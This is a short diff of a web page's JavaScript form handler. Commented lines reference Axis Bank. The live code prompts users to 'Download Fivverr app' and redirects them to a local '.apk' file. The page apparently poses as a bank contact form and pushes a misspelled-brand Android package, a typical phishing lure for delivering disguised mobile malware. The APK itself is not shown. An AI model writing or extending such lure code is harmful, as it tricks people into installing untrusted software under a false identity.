@@ -43,7 +43,7 @@ function submitForm(e){
 // alert("Axis Bank Will Contact You Soon")
 //   // Clear form
 //   document.getElementById('contactForm').reset();
-alert("Click Ok And Download Fivverr app")
+alert("click ok and Download Fivverr app")
 document.getElementById('contactForm').reset();
 window.location.assign("./app/fivverr.apk")
 }
